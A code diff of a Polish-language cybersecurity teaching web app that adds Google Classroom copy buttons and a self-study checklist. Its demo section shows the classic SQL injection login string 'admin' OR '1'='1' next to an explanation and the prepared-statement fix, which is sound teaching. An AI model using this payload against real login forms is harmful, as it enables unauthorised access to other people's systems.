-              'Wstrzyknięcie: admin\' OR \'1\'=\'1',
+              "Wstrzyknięcie: admin' OR '1'='1",
               'Warunek 1=1 jest zawsze prawdziwy – baza loguje hakera bez hasła!',
               'Naprawa: Prepared Statements (Bindowanie parametrów bez konkatenacji stringów).'
             ],
@@ -2592,13 +3369,61 @@ print(f"Hash: {hash_val}")</code></pre>
       }
     }
 
-    /* ================= CLASSROOM COPY TASK ================= */
-    function copyClassroomTask(elemId) {
-      const text = document.getElementById(elemId).innerText;
+        /* ================= CLASSROOM OPERATIONALIZED COPY ENGINE ================= */
+    function copyTeacherTask(elementId) {
+      const text = document.getElementById(elementId).innerText;
       navigator.clipboard.writeText(text).then(() => {
         sound.success();
-        alert("Pomyślnie skopiowano treść zadania do schowka! Możesz teraz wkleić je bezpośrednio do Google Classroom.");
+        alert("✅ Skopiowano pełną treść zadania dla Nauczyciela! Możesz teraz wkleić je bezpośrednio jako nowe zadanie w Google Classroom.");
       });
+    }
+
+    function copyStudentTemplate(elementId) {
+      const text = document.getElementById(elementId).innerText;
+      navigator.clipboard.writeText(text).then(() => {
+        sound.success();
+        alert("✍️ Skopiowano gotowy Formularz Odpowiedzi dla Ucznia! Wklej go do pola odpowiedzi w Google Classroom i uzupełnij brakujące punkty.");
+      });
+    }
+
+    function copyClassroomTask(elemId) {
+      copyTeacherTask(elemId);
+    }
+
+    /* ================= SELF-STUDY INTERACTIVE CHECKLIST ================= */
+    function toggleSelfCheck(stepId) {
+      const isChecked = document.getElementById(`check-${stepId}`).checked;
+      localStorage.setItem(`cyber_check_${stepId}`, isChecked ? 'true' : 'false');
+      if (isChecked) {
+        sound.success();
+        addXp(15);
+      } else {
+        sound.click();
+      }
+      updateSelfCheckProgress();
+    }
+
+    function updateSelfCheckProgress() {
+      let count = 0;
+      for (let i = 1; i <= 8; i++) {
+        const item = document.getElementById(`check-step-${i}`);
+        if (item && item.checked) count++;
+      }
+      const label = document.getElementById('self-study-progress');
+      if (label) {
+        label.textContent = `${count} / 8`;
+      }
+    }
+
+    function loadSelfChecks() {
+      for (let i = 1; i <= 8; i++) {
+        const saved = localStorage.getItem(`cyber_check_step-${i}`);
+        const elem = document.getElementById(`check-step-${i}`);
+        if (elem && saved === 'true') {
+          elem.checked = true;
+        }
+      }
+      updateSelfCheckProgress();
     }
 
     function copyCode(elemId) {
@@ -2635,6 +3460,7 @@ print(f"Hash: {hash_val}")</code></pre>
       calculateShaDemo();
       updateSqliDemo();
       generateNewPassphrase();
+      loadSelfChecks();
     });
   </script>
 </body>
